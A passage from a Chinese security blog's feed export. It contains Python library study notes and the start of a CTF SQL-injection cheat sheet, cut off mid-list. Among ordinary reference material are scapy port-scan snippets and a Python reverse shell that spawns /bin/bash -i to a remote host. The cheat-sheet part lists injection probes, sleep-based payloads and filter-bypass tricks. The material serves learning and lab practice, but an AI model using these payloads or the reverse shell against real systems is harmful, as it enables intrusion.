        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python库学习]]></title>
    <url>%2F2021%2F12%2F31%2FPython%E5%BA%93%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[前言 说明：所有库(除开os、time、sys标准库)，按照案例实现的方式，对重要代码进行了总结，方便之后进行复习。 数据包制作/网络通信/扫描相关模块包含了socket、scapy、nmap库 应用程序服务相关模块包含了paramiko、ftplib、pymysql库 网络请求模块包含了urllib、urllib2、request库 进程/多线程/多进程/队列相关模块包含了subprocess、threading、multiprocessing、queue库 命令行解析有argparse库 编码解码包含了base64、hashlib库 常用标准库包含了time、random、re、sys、os库 据包制作/网络通信/扫描相关模块socket功能： socket实现简单服务端客户端通信(C/S)服务端 123456789101112131415# 0x01创建socket对象（AF_INET=IPv4，SOCK_STREAM=流式socket，for TCP）sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 0x02为socket绑定IP端口sk.bind(('主机地址', 端口))# 0x03设置监听sk.listen(5)# 0x04设置堵塞(返回一个通信对象conn 和 一个连接地址 address)conn,address = sk.accept()# 0x05数据交互发送数据conn.send() # 发送数据 返回值为发送数据字节数量conn.sendall() # 完整发送数据，返回之前会尝试发送所有数据，成功返回None，失败则抛出异常# 接收数据conn.recv(bufsize) # bufsize为接收大小 # 0x06关闭连接sk.close() 客户端 123456789# 0x01 创建socket对象sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 0x02连接sk.connect(('主机地址', 端口))# 0x03数据交互发送数据conn.send() #发送数据 返回值为发送数据字节数量conn.sendall() #完整发送数据，返回之前会尝试发送所有数据，成功返回None，失败则抛出异常接收数据conn.recv(bufsize) # bufsize为接收大小# 0x04关闭sk.close() scapy功能：scapy实现主机发现功能123456# 1. 构造arp数据包arp = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='IP段')# 2. 发送数据包(res 保存探测结果 unres 保存未答复的)（srp 二层发包 具有接收功能）res,unres = srp(arp, timeout=2)# 3. 显示结果（res保存着存活主机的结果集，s是res中的一个头部 ，h也是res中的一个头部，只不过，很多信息保存在h头部里。 h.hwsc 代表目的MAC地址，h.psrc代表目的的IP地址。）for s,h in res: print("MAC："+h.hwsrc+" "+"IP："+h.psrc) 功能：scapy实现TCP全连接端口扫描12345678# 1. 构造tcp端口扫描数据包tcp = IP(dst='目的IP')/TCP(dport=端口号, flags="S")# 2. 发送数据包(sr1 在三层发送数据包 有接收功能 只接收一个)res = sr1(tcp, timeout=2)# 3 . 判断 接收数据包的TCP头部的flags 含有 SA(端口打开) 或 RA(端口关闭)if res['TCP'].flags == 'SA' 或者 ifres['TCP'].flags =='RA'# 4 . 继续发送数据包 继续完成三次握手 (如果上一步为RA 则直接输出当前端口关闭)res = sr1(IP(dst='目的IP')/TCP(dport=端口号, flags="AR"), timeout=2) 功能：scapy实现ICMP探测主机存活1234567891011# 1 . 构造icmp数据包icmp = IP(dst='目的IP', id=100)/ICMP(seq=100, id=100)/b'hello'# 2 . 发送数据包res = sr1(icmp, timeout=2)# 3 . 判断主机存活和输出结果判断if res: # 输出结果 # 输出地址 res['IP'].src # 输出ttl值 res.['IP'].ttl 功能：scapy实现syn半开方式扫描（与TCP扫描区别在于继续发送数据包中的flags 为 R）12345678# 1. 构造syn端口扫描数据包syn = IP(dst='目的IP')/TCP(dport=端口号, flags="S")# 2. 发送数据包(sr1 在三层发送数据包 有接收功能 只接收一个)res = sr1(syn, timeout=2)# 3 . 判断 接收数据包的TCP头部的flags 含有 SA(端口打开) 或 RA(端口关闭)if res['TCP'].flags == 'SA' 或者 ifres['TCP'].flags =='RA'# 4 . 继续发送数据包 完成完成三次握手 (如果上一步为RA 则直接输出当前端口关闭)res = sr1(IP(dst='目的IP')/TCP(dport=端口号, flags="R"), timeout=2) nmapnmap 扫描参数 主机发现 1-sP -sn -sA 端口扫描 1-sS -sT -sU 检测应用程序版本和操作系统信息 1-sV(应用程序版本) -O(操作系统信息) 脚本使用 1--script=vuln(扫描主机是否存在常见漏洞) 功能：nmap实现端口扫描和结果输出（输出 PORT STATE SERVICE VERSION ）12345# 1 . 创建对象nm = nmap.PortScanner()# 2 . 填写参数执行扫描(根据参数自定义)nm.scan(hosts='IP/IP段', arguments='-sV -p0-65535') # 3 . 显示结果（返回的对象可以用以下方法进行处理） PortScanner()类方法 示例 nm.command_line() 1. command_line() 返回扫描方法 2. scaninfo() 返回nmap扫描信息 3. all_hosts() 返回nmap扫描的主机清单PortScannerHostDict()类方法 示例 nm[‘ip’].hostname() hostname() 返回扫描对象主机名 state( ) 返回扫描对象状态 all_protocols() 返回扫描的协议 all_tcp() 返回tcp协议扫描的端口 tcp(port) 返回扫描tcp协议port端口的信息 all_udp() 返回udp协议扫描的端口 udp(port) 返回扫描udp协议port端口的信息 应用程序服务相关模块paramikoSSHClient() 类 功能：paramiko库的SSHClient实现ssh连接和执行命令并回显结果1234567891011121314# 1. 创建ssh对象client = paramiko.SSHClient()# 2 . 设置远程服务器应对策略client.set_missing_host_key_policy(paramiko.AutoAddPolicy())# 3 . 设置参数进行连接client.connect(hostname='主机地址' , port='主机端口', username='主机用户名', password='主机密码')# 4 . 执行命令stdin,stdout,stderr = clinet.exec_command('netstat -lnt')stdout 为正确输出 stderr 为错误输出 两者同时只有一个变量有值# 5 . 输出结果输出# 正确结果if stdout: print(stdout.read().decode('utf-8'))# 输出错误结果if stderr: print(stderr.read().decode('utf-8')) 功能：SSHClient封装Transport方式实现ssh连接123456789101112# 1 . 创建一个通道transport = paramiko.Transport(('主机地址', 端口号))transport.connect(username='主机用户名', password='主机密码')# 2 . 创建SSHClient对象ssh = paramiko.SSHClient()ssh._transport = transport# 3 . 执行命令stdin,stdout,stderr = ssh.exec_command('netstat -lnt')# 4 . 输出结果# 输出正确结果if stdout: print(stdout.read().decode('utf-8'))# 输出错误结果 if stderr: print(stderr.read().decode('utf-8')) SFTPClient() 类功能：SFTPClient封装Transport方式实现文件上传与下载12345678910# 1 . 创建通道tran = paramiko.Transport(('主机地址', 端口号))tran.connect(username='主机名', password='主机密码')# 2 . 创建SFTP对象sftp = paramiko.SFTPClient.from_transport(tran)# 3 . 设置路径localpath = '本地文件路径'remotepath = '远程文件路径'# 4 . 执行上传sftp.put(localpath, remotepath)# 5 . 执行下载stfp.get(remorepath, localpath) 常用方法 mkdir() 在服务上创建目录 remove() 在服务器上删除目录 rename() 在服务器上重命名目录 stat() 查看服务器文件目录 listdir() 列出服务器目录下的文件 ftplib功能：实现上传本地文件到ftp服务器12345678910111213141516171819202122232425262728# 创建对象ftp = ftplib.FTP()# 配置连接# 设置调试级别，显示详细信息ftp.set_debuglevel(2)# 连接ftp serverftp.connect('主机地址', '端口号')# 登录ftp.login('ftp用户名', '密码')# 输出欢迎信息print(ftp.getwelcome())# 执行操作# 设置缓冲区大小bufsize = 1024# 设置本地路径localpath = '本地文件路径'# 设置远程文件路径remotepath = '远程文件路径'# 打开本地路径文件file = open(filename, 'rb')# 上传文件ftp.storbinary("STOR"+remotepath, remotepath, bufsize)# 关闭调试信息ftp.set_debuglevel(0)# 关闭文件ftp.quit() 功能：实现从ftp服务器下载文件到本地1234567891011121314151617181920212223# 创建对象ftp = ftplib.FTP()# 配置连接# 设置调试级别，显示详细信息ftp.set_debuglevel(2)# 连接ftp serverftp.connect('主机地址', '端口号')# 登录ftp.login('ftp用户名', '密码')# 输出欢迎信息print(ftp.getwelcome())# 执行操作# 设置缓冲区大小bufsize = 1024# 设置本地路径localpath = '本地文件路径'# 设置远程文件路径remopepath = '远程文件路径'# 打开本地文件路径file = open(localpath, 'wb').write# 下载文件ftp.retrbinary("RETR"+remopepathf, file, bufsize)# 关闭调试信息ftp.set_debuflevel(0)# 关闭文件ftp.quit() 相关方法 ftp.dir() 显示目录下所有目录信息 ftp.nlst() 获取目录下的文件 ftp.pwd() 返回当前所在位置 ftp.cwd(pathname) 设置FTP当前操作路径 ftp.mkd(pathname) 新建远程目录 ftp.rmd(dirname) 删除远程目录 ftp.delete(filename) 删除远程文件 ftp.rename(fromname, toname) 将fromname 修改名称为 toname MySQLdb(只支持到py3.4)、pymysql(支持py3.5+) （查阅资料后 两个库基本方法均一致 用pymyql演示） 功能：实现数据库连接后进行增删改查1234567891011121314# 创建连接conn = pymysql.connect('主机地址', 'mysql用户名', '密码', '数据库')# 创建游标cur = conn.cursor()# 执行sqlcur.execute(sql语句)# 输出结果data = cur.fetchone() # 输出一条结果data = cur.fetchall() # 输出所有结果# 关闭游标cur.close()# 关闭连接conn.close() 功能：pymysql实现数据库DML操作123456789101112# 创建连接conn = pymysql.connect('主机地址', 'myql用户名', '密码', '数据库')# 创建游标cur = conn.cursor()# 执行sqlcur.execute("update 表名 set 字段名='新值' where 条件 ")# 关闭游标cur.close()# 执行DML语句 保存方法cur.commit()# 关闭连接conn.close() 相关SQL语句： 增： 增加表 1create table 表名 (字段名 字段类型 其他, 字段名 字段类型 其他, ...); 增加字段 1alter table 表名 add 字段 类型 其他; 删： 删除表 1drop table 表名 删除表中数据 1delete from 表名 where 表达式 改： 改表名 1rename table 原表名 to 新表名; 改字段 1update 表名 set 字段=新值 where 条件 网络请求模块功能：python2下 urllib+urllib2 进行POST提交数据（dvwa xss 提交数据为例）1234567891011121314# 设置提交urlurl = 'http://127.0.0.1/DVWA/vulnerabilities/xss_s/'# 设置请求头部headers = &#123;'cookie': 'cookie值'&#125;# POST提交data 参数data = &#123;'txtName': '标题', 'mtxMessage': '内容', 'btnSign': 'Sign Guestbook'&#125;# data 进行url编码data = urllib.urlencode(data)# 构建Request 对象request = urllib2.Request(url, data, headers)# 请求urlopen() 只接收url, data, timeout 三个参数resp = urllib2.urlopen(request)# 输出结果print(resp.read()) 功能：python2 下用 urllib2 + re 实现对dvwa（xss）评论内容爬取12345678910111213# 设置爬取的urlurl = "http://127.0.0.1/DVWA/vulnerabilities/xss_s/"# 设置头部headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36', 'Cookie': ' security=impossible; PHPSESSID=adcc9b21be4a5689bc5fa145a9f15a25'&#125;# 构造Request对象request = urllib2.Request(url=url, headers=headers)# 请求urlopen()resp = urllib2.urlopen(request)str1 = resp.read()# 正则匹配内容数据(绿色部分为正则表达式)result = re.findall('&lt;div id="guestbook_comments"&gt;Name: ([a-z1-9A-Z]+)&lt;br /&gt;Message: ([a-zA-Z0-9]+)&lt;br /&gt;&lt;/div&gt;', str1)# 输出for item in result: print('Name:'+item[0]+'Content:'+item[1]) 功能：python3下 urllib 进行POST提交数据（dvwa xss 提交数据为例） （说明：python3下 urllib和urllib2 合并成了一个urllib 这个包分为四个模块 ） (分为：urllib.request urllib.error urllib.parse urllib.robotaparser) 123456789101112# 设置提交链接url = ' http://127.0.0.1/DVWA/vulnerabilities/xss_s/'# 设置headers头部headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Cookie':'security=low; PHPSESSID=c53448691f29843f229d25fdc0b4871a'&#125;# 构建data数据data = &#123;'txtName': 'python3', 'mtxMessage': 'connect', 'btnSign': ' Sign Guestbook'&#125;# data进行url编码data = urllib.parse.urlencode(data)# 构建request对象request = urllib.request.Request(url, data.encode('utf-8'), headers)# urllib.request.urlopen()提交resp = urllib.request.urlopen(request) 功能：python3 下 urllib2 + re 实现对dvwa（xss）评论内容爬取12345678910111213# 设置urlurl = 'http://127.0.0.1/DVWA/vulnerabilities/xss_s/ '# 设置头部headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Cookie': 'security=low; PHPSESSID=c53448691f29843f229d25fdc0b4871a'&#125;# 构建requestrequest = urllib.request.Request(url=url, headers=headers)# urlopen() 进行请求resp = urllib.request.urlopen(request)# 用re正则 对返回结果进行处理（转为返回结果文本格式为gbk）str1 = resp.read().decode('gbk')res = re.findall('&lt;div id="guestbook_comments"&gt;Name: ([a-z1-9A-Z]+)&lt;br /&gt;Message: ([a-zA-Z0-9]+)&lt;br /&gt;&lt;/div&gt;', str1)# 输出结果print('Tittle'+'\t'+'Connect')for item in res: print(item[0] + '\t\t' + item[1]) 功能：python3下 requests 进行POST提交数据（dvwa xss 提交数据为例）12345678# 设置提交url地址url = 'http://127.0.0.1/DVWA/vulnerabilities/xss_s/ '# 构建headers头部headers = &#123;'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Cookie': ' security=low; PHPSESSID=c53448691f29843f229d25fdc0b4871a'&#125;# 构建需要提交的data数据data = &#123;'txtName': 'request', 'mtxMessage': '123456789', ' btnSign':' Sign Guestbook'&#125;# 进行提交resp = request.post(url=url, data=data, headers=headers) 功能：python3 下 request +re 实现dvwa（xss）评论内容爬取12345678910# 设置url链接url = ' http://127.0.0.1/DVWA/vulnerabilities/xss_s/'# 构建headers头部headers = &#123;'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Cookie': ' security=low; PHPSESSID=c53448691f29843f229d25fdc0b4871a'&#125;# 进行提交resp = request.get(url=url, headers=headers)str1 = resp.text# 用re正则对返回结果进行处理res = re.findall('&lt;div id="guestbook_comments"&gt;Name: ([a-z1-9A-Z]+)&lt;br /&gt;Message: ([a-zA-Z0-9]+)&lt;br /&gt;&lt;/div&gt;', str1)# 输出print('Tittle'+'\t'+'Connect')for item in res: print(item[0] + '\t\t' + item[1]) 进程/多线程/多进程/队列相关模块subprocess功能：subprocess实现执行命令输出结果 （subprocess 有4个方法都可以实现创建子进程功能，四个方法都是对Popen()方法的封装）（分别为：call() check_call() check_output() 以及3.5之后代替前三个方法的run()） run()方法 1234# 调用子进程(返回CompletedProcess对象)s = subprocess.run([&apos;ipconfig&apos;, &apos;-all&apos;], stdout=subprocess.PIPE, shell=True)# 输出结果print(s.stdout.decode(&apos;GBK&apos;)) Popen()方法(支持stdin和stdout) 123456789# 调用子进程(返回subprocess.Popen对象)s = subprocess.Popen('python', stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)# 输入s.stdin.write(b'import sys \n')s.stdin.write(b'print(sys.version) \n')s.stdin.close()# 输出print(s.stdout.read().decode('GBK'))s.stdout.clode() 功能：subprocess+socket实现(linux下)反弹shell功能123456789101112# 创建socket对象s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 连接到远程主机s.connect(('主机地址', 端口号))# 将socket对象的文件描述符复制到系统 0标准输入 1标准输出 2标准错误#（os.dup2(fd, fd2) 将文件描述符fd复制到fd2 ）# (s.fileno() 获取socket对象的文件描述符)os.dup2(s.fileno(), 0)os.dup2(s.fileno(), 1)os.dup2(s.fileno(), 2)# 调用call() 执行指令p = subprocess.call(['/bin/bash', '-i']) threading功能：执行输出任务，创建十条线程，同步执行 123456789101112131415# 创建一个需要用多线程完成的任务def task(num): for _ in range(10): print('[+] this is %s'%(num)) print('[+] %s end'%(num))# 创建线程池threads = []# 创建多线程并启动多线程for i in range(11): thread = threading.Thread(target=task, args=(i,), name='线程名') threads.append(thread) thread.start()# 设置堵塞for thread in threads: thread.join() multiprocessing(方法与threading的常用几个方法类似)功能：multiprocessing.Process实现多进程1234567891011121314151617# 创建一个需要用多进程完成的任务def worker(num): for _ in range(10): print("[+] This is %s"%(num)) print("[+] %s end"%(num)) # 创建进程池 courses = []# 创建进程并启动多进程for i in range(10): course = multiprocess.Process(target=worker, args=(i,), name='进程名') courses.append(course) courses.start() # 设置堵塞for course in courses: course.join() 功能：multiprocessing.dummy实现多线程12345678910111213141516# 导包from multiprocess.dummy import Pool as ThreadPool# 创建一个需要用多线程完成的任务def worker(num): print('[+] This is %s'%(num)) time.sleep(1) # 开4个 worker， 没有参数时默认是cpu的核心数pool = ThreadPool(4)# 设置任务所需参数(把列表遍历完，就会结束, 写爬虫的时候可以用来遍历url)nums = [1,2,3,4,5,6,7,8,9,0]# 执行任务（同时执行4个任务，相当于每次遍历4个,遍历完就结束）results = pool.map(worker, nums)# 关闭和阻塞pool.close()pool.join() queue功能：从文件中读取字符保存到队列(queue对象)中，再进行输出 123456789101112131415# 设置读取文件路径filePath = 'file.txt'# 创建队列q = queue.Queue()# 打开文件并输出到队列with open(filePath) as f: for line in f: password = line.strip('\n') q.put(password)# 输出队列while True: if not q.empty(): print(q.get()) else: break 命令行解析模块argparse功能：实现创建命令行选项 12345678# 创建对象parse = argparse.ArgumentParser(description='在-h中显示的解析注释')# 添加参数#（add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar] [, dest] )）parse.add_argument('-f', '--file', dest='filename', help='set filename path')parse.add_argument('-y', '--yes', action='store_false', help="action default false ")# 解析参数args = parse.parse_args() 编码解码base64功能：实现对字符串的base64编码解码 (说明：因编码只能是bytes 需要进行utf-8编码 输出的时候 需要str 进行转码输出) 123456789101112# 定义字符串str1 = "system('cat /flag.txt');"# 字符串utf-8编码str1 = str1.encode(encoding='utf-8')# base64编码en_str = base64.b64encode(str1)print("base64编码前："+ str(str1))print("base64编码后：" + str(en_str))# base64解码de_str = base64.b64decode(en_str)print("base解码前："+str(en_str))print("base解码后："+str(de_str)) hashlib功能：hashlib实现对字符串的md5加密123456789101112# 定义字符串str1 = 'This is not md5'# 字符串编码 str1 = str1.encode(encoding='utf-8')# 创建md5对象m = hashlib.md5()# 加密m.update(str1)str1_md5 = m.hexdigest()# 输出print("MD5加密前："+str(str1))print("MD5加密后："+str1_md5) 常用标准库time–时间的访问和转换 （三种方式表示时间：1.timestamp(时间戳) 2. struct_time (格式化的时间字符串) 3. tuple(元组)） 时间格式相互转化关系图 time() 返回当前时间的时间戳 localtime([secs]) 将一个时间戳转换位当前时区的struct_time,secs参数未提供，则以当前时间为准 asctime([t]) 将一个表示时间的元组或者struct_time表示为”Sun Jun 20 23:21:05 2020” 这种形式 不设置参数时，默认将time_localtime() 作为参数 mktime(t) 将一个struct_time转化为时间戳 sleep(secs) 线程推迟指定的时间运行，单位为秒 gmtime([secs]) 将一个时间戳转换为UTC时区的struct_time ctime([secs]) 把一个时间戳转化为time.asctime()”Sun Jun 20 23:21:05 2020”的形式，不设置参数时，默认time.time()为参数 strftime(format[, t]) 把一个代表时间的元组或者struct_time（如由time.localtime()和time.gmtime()返回) 转化为格式化的时间字符串 如t未指定，将传入time.localtime() strptime(string[, format]) 把一个格式化时间字符串转化为struct_time，与strftime是逆操作 random–生成伪随机数 random() 随机生成0.xxx 的浮点小数 12random.random() &gt;&gt;&gt;0.2786970302306403 uniform(a, b) 随机生成一个指定范围内的浮点数，a是低位，b是高位 1234random.uniform(1, 10)&gt;&gt;&gt;2.431852539010123random.uniform(20,100)&gt;&gt;&gt;87.86159294411607 randint(a, b) 随机生成一个指定范围内的整数，a是低位，b是高位 1234random.randint(1, 20)&gt;&gt;&gt;18random.randint(20, 50)&gt;&gt;&gt;26 choice(squence) 随机从squence（表示一个有序类型，不是特定类型，而是泛指一些列类型，list，tuple，字符串(字典和集合都是无序的)）中返回一个元素 x = [2,3,4,1,5,6,7,8,9]random.choice(x) 3x = [2,3,4,1,5,6,7,8,9]random.choice(x)9 sample(sequence, k) 随机从指定序列sequence中返回长度k的片段 123456x = [1,2,3,4,5,6,7,8]random.sample(x, 2)&gt;&gt;&gt;[8,4]x = [1,2,3,4,5,6,7,8]random.sample(x, 4)&gt;&gt;&gt;[1,6,3,5] shuffle(x) 用于将一个列表打乱 (洗牌) 123x = [1,2,3,4,5,6,7,8]random.shuffle(x)&gt;&gt;&gt;[3, 2, 7, 1, 6, 8, 4, 5] re–正则表达式操作正则表达式修饰符（对应flags）1. re.I 忽略大小写 2. re.L 做本地化识别（locale-aware）匹配 3. re.M 多行匹配，影响^和$ 4. re.S 即为.并且包括换行符在内的任意字符（.不包括换行符） 5. re.U 表示特殊字符集\w,\W,\b,\B,\d,\D,\s,\S 依赖于Unicode字符属性数据库 6. re.x 为了增加可读性，忽略空格和#后面的注释正则表达式常用模式 模式 描述 ^ 匹配字符串的开头 $ 匹配字符串的末尾 […] 用来表示一组字符[0-9] [a-z] … [0-9] 匹配任何数字 [a-z] 匹配任何小写字母 [A-Z] 匹配任何大写字母 re{n} 精确匹配n个前面表达式 re{n,m} 匹配n到m次由前面的正则表达式定义的片段 a|b 匹配a或b (re) 对正则表达式分组并记住匹配的文本 \w 匹配字母数字及下划线 \W 匹配非字母数字及下划线 \s 匹配任意空白字符 \S 匹配任意非空字符 \d 匹配任意数字 \D 匹配任意非数字 正则表达式常用方法 re.compile(pattern[, flags]) 用于编译正则表达式 12345678910pattern = re.compile(r'\d+')res = pattern.match('one12twothree34four')&gt;&gt;&gt;noneres = pattern.search('one12twothree34four')&gt;&gt;&gt;&lt;_sre.SRE_Match object; span=(2, 4), match='12'&gt;&gt;&gt;&gt;m.group()&gt;&gt;&gt;'12'res = pattern.findall('one12twothree34four')&gt;&gt;&gt;['12', '34'] re.search(pattern, string[, flags]) pattern匹配整个字符串，返回第一个成功的匹配 123res = re.search(r'\d+', 'abcdefghijkl123lnm345')res.group()&gt;&gt;&gt;'123' re.match(pattern, string[, flags]) pattern匹配字符串起始位置，起始位置没有，则返回none 12345res = re.match(r'\d+', 'abcdef123lijklm345')&gt;&gt;&gt;noneres = re.match(r'\d+', '123abcdef456')&gt;&gt;&gt;res.group()&gt;&gt;&gt;'123' re.findall(patter, string[, flags]) patter匹配整个字符串的所有字串，返回一个列表 12res = re.findall(r'\d+', 'abc123def456lkj789')&gt;&gt;&gt;['123', '456', '789'] sys sys模块负责程序与python解释器的交互，提供了一系列的函数和变量，用于操控python的运行时环境。 python解释器交互 sys.argv[0] 一个列表，其中包含了被传递给python脚本的命令行参数 sys.platform 返回运行平台更详细的信息 sys.executable 返回python解析器对应的可执行程序所在的绝对路径 sys.modules 一个字典，包含的是各种以加载的模块的模块名到模块具体位置的映射，可以通过修改这个字典，重新加载某些模块 sys.builtin_module_names 一个字符串元组，元素均为当前所使用的python解释器内置模块名称 sys.path 一个字符串组成的列表，各个元素表示的是python搜索模块的路径，在程序期间被初始化 sys.stdin 一个属性，python标准输入通道，可实现输入重定向 sys.stdout 一个属性，python标准输出，可以实现输出到屏幕或文件中 sys.err 一个属性，标准错误输出，输出到屏幕 sys.getrecursionlimit() 获取python的最大递归数目 sys.setrecursionlimit() 设置最大递归数目 sys.getrefcount() 返回python中某个对象被引用的次数 sys.getsizeof() 返回作用对象所占用的字节数 sys.ps1 一级提示符 python交互界面的 &gt;&gt;&gt; sys.ps2 二级提升符 if xx: 之后的 … os os模块负责程序与操作系统的交互，提供了访问操作系统底层的接口 （参考： https://docs.python.org/zh-cn/3.6/library/os.html，https://www.runoob.com/python/python-os-path.html ， https://www.runoob.com/python/os-file-methods.html） 文件和目录（操作文件和目录、进程、文件标识符、路径） os.access(path, mode) 检验权限 os.chdir(path) 将当前工作目录更改为path os.chflags(path, flags) 设置路径的标记为数字标记 os.chmod(path, mode) 更改路径权限 os.chown(path, uid, gid) 更改文件所有者 （Unix） os.chroot(path) 将当前进程的根目录更改为path （Unix） os.fchdir(fd) 将当前工作目录更改为文件描述符fd指向的目录（Unix） os.getcwd() 返回表示当前工作目录的字符串 os.link(src, dst) 创建一个指向src的硬链接，名为dst （Unix、Windows） os.symlink(src, dst) 创建一个指向src的软链接，名为dst os.listdir(path) 返回一个列表，该列表包含了path中所有文件与目录 os.mkdir(path[,mode]) 创建一个名为path的目录，应用以数字表示的权限模式mode os.makedirs(name[, mode]) 递归目录创建函数 os.mkfifo(path[, mode]) 创建命名管道，mode为数字 os.remove(path) 删除文件path os.removedirs(name) 递归删除目录 os.rmdir(path) 删除目录 os.rename(src, dst) 将文件或目录src重命名为dst os.renames(old, new) 递归地对文件或目录进行重命名 os.replace(src, dst) 将文件或目录src重命名为dst os.stat(path) 获取path指定的路径的信息 文件描述符操作（ 这些函数对文件描述符所引用的I/O 流进行操作。） os.close(fd) 关闭文件描述符fd os.closerange(fd_low, fd_high) 关闭fd_low(包括) 到 fd_high(排除)间的文件描述符 os.dup(fd) 复制一个文件描述符的副本 os.dup2(fd, fd2) 将文件描述符fd复制到fd2 os.fchdir(fd) 将当前工作目录更改为文件描述符fd指向的目录 os.fchmod(fd, mode) 将fd指定文件的权限状态修改为mode os.fchown(fd, uid, gid) 分别将fd指定文件的所有者和组ID修改为uid和gid值 os.fdatasync(fd) 强制将文件描述符fd指定文件写入磁盘 os.fdopen(fd) 返回打开文件描述符fd对应文件的对象 os.fpathconf(fd, name) 返回与打开的文件有关的系统配置信息 os.fstat(fd) 获取文件描述符fd的状态，返回一个stat_result对象 os.fstatvfs(fd) 返回文件系统的信息，该文件系统是文件描述符fd指向的文件所在的文件系统 os.open(path, flags, mode=0o77) 打开文件 path，根据 flags 设置各种标志位，并根据 mode 设置其权限模式。 os.write(fd, str) 将str中的字节串写入文件描述符fd。返回实际写入的字节数。 os.read(fd, n) 从文件描述符fd中最多读取n个字节。返回一个包含读取字节的字节字符串。 进程参数（ 这些函数和数据项提供了操作当前进程和用户的信息。） os.ctermid() 返回与进程控制终端对应的文件名（Unix） os.getlogin() 返回通过控制终端进程进行登录的用户名（Unix、Windows） os.uname() 返回当前操作系统的识别信息（Unix） os.setgid(gid) 设置当前进程的组ID（Unix） os.setsid() 使用系统调用 getsid()（Unix） os.setuid(uid) 设置当前进程的用户ID（Unix） os.getgid() 返回当前进程的实际组ID（Unix） os.getsid(pid) 调用系统调用 getsid()（Unix） os.getuid() 返回当前进程的真实用户ID（Unix） os.getpid() 返回当前进程ID（Unix） os.setegid(egid) 设置当前进程的有效组ID （Unix） os.seteuid(euid) 设置当前进程的有效用户ID (Unix) os.getegid() 返回当前进程的有效组ID（Unix） os.geteuid() 返回当前进程的有效用户ID（Unix） os.setpgid(pid, pgrp) 使用系统调用setpgid(),将pid对应进程的组ID设置为pgrp（Unix） os.getpgid(pid) 根据进程id pid 返回进程的组ID列表（Unix） 进程管理（ 函数可用于创建和管理进程） os._exit(n) 以状态码n(退出原因指令)退出进程,通常用在fork() 出的子进程中使用 os.fork() Fork出一个子进程（Unix） os.forkpty() Fork出一个子进程，使用新的伪终端作为子进程的控制终端（返回一对pid, fd）（Unix） os.kill(pid, sid) 将信号sig发送至进程pid sid值为signal.SIGKILL 为终止程序（Unix） os.popen(command[, mode[, bufsize]]) 从一个command打开一个管道 os.system(command) 在子shell中执行命令（字符串） 操作路径 os.path ( 该模块在路径名上实现了一些有用的功能)​ os.path.abspath(path) 返回路径path的绝对路径 os.path.basename(path) 返回路径path的基本名称 os.path.commonpath() os.path.commonprefix(list) 返回list(多个路径)中,所有path共有的最长的路径 os.path.dirname(path) 返回文件路径 os.path.exists(path) 路径path存在，返回True，不存在，返回False os.path.lexists() 路径存在则返回True,路径损坏也返回True os.path.getatime(path) 返回最近访问时间（浮点型秒数） os.path.getmtime(path) 返回最近文件修改时间 os.path.getctime(path) 返回path创建时间 os.path.getsize(path) 返回文件大小，如果文件不存在就返回错误]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python常用库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web【SQL注入】漏洞做题姿势积累]]></title>
    <url>%2F2021%2F11%2F15%2FCTF-Web%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
    <content type="text"><![CDATA[前言 本篇文章专门用于记录做SQL注入类题目的做题姿势，会不断更新。 判断注入常用的的方式1234567891011&apos; // 报错有可能存在注入1 or 1=1 # // 正常显示 可能存在注入 意味着还需要进一步注入1 and 1=1 # // 正常显示 可能存在注入1 and 1=2 # // 不能显示 存在注入1 || or 1=1 # //1 &amp;&amp; 1=1 #1^0 # // 显示异常 则存在注入1^1 # // 显示正常，可能存在注入1&apos; or 3&gt;2 --1&apos; or 3&lt;2 --%DF&apos; union select 1,2,3 -- - // 宽字节注入 延时注入检测payload1admin&apos; AND (SELECT 4792 FROM (SELECT(SLEEP(5)))Nttm) AND &apos;fJzs&apos;=&apos;fJzs 11 and (select 6583 from (select(sleep(5)))SjTQ) 过滤绕过等于号被过滤123456and=`&amp;&amp;` or=`||` xor=`|` not=`!`&lt;&gt; likeinbetween andregexp 123456$sql = select * from user where id=1;使用in方法绕过使用示例：$sql = select * from user where id in (1);使用like 绕过$sql = select * from user Where id like 5 逗号绕过12345678910111213141516171819select substr(database() from 1 for 1);select mid(database() from 1 for 1);select * from news limit 0,1# 等价于下面这条SQL语句select * from yang limit 1 offset 0union select 1,2等价于union select * from (select 1)a join (select 2)bselect ascii(mid(user(),1,1))=80 #等价于select user() like 'r%'select * from news limit 0,1等价于select * from news limit 1 offset 0 空格被过滤，替代方法12345678910%09 TAB键（水平）%0a 新建一行%0b TAB键（垂直）%0c 新的一页%0d return 功能%a0 空格%20 空格()&lt;&gt;/**/ 可用注释符12345--+#%23;%00,&apos;1 使用等价函数绕过关键字被过滤1234编码双写绕过大小写绕过... 12345678910111213141516171819hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; 